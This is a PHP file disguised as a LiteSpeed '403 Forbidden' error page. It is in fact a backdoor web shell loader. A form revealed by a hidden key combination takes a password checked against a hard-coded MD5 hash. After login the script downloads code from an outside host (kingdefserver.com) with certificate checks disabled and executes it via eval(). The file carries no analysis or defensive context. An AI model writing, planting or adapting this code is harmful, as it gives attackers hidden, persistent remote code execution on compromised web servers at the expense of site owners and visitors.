<?php
session_start();

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '8aa784143c699e165a87db58b5c42654';
    if (md5($entered_password) === $hashed_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu';
    } else {
        echo "Incorrect password. Please try again.";
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://kingdefserver.com/script/alfax.txt');
    eval('?>' . $a);
} else {
    ?>
    <!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title>403 Forbidden</title>
        <script>
            document.addEventListener('keydown', function(event) {
                if (event.ctrlKey && event.shiftKey && event.code === 'KeyL') {
                    document.getElementById('login-form').style.display = 'block';
                }
            });
        </script>
        <style>
@media (prefers-color-scheme:dark){
  body{background-color:#000!important}
}
</style>
        <style>
            #login-form { display: none; }
        </style>
        
    </head>
    <body style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff;">
<div style="height:auto;min-height:100%;">
  <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;">
    <h1 style="margin:0;font-size:150px;line-height:150px;font-weight:bold;">403</h1>
    <h2 style="margin-top:20px;font-size:30px;">Forbidden</h2>
    <p>Access to this resource on the server is denied!</p>
  </div>
</div>

<div style="color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top:1px solid rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(255,255,255,.3) inset;">
<br>
Proudly powered by LiteSpeed Web Server
<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
</div>
    <body>
        <form id="login-form" method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Halo Pulici">
        </form>
    </body>
    </html>
    <?php
}
?>
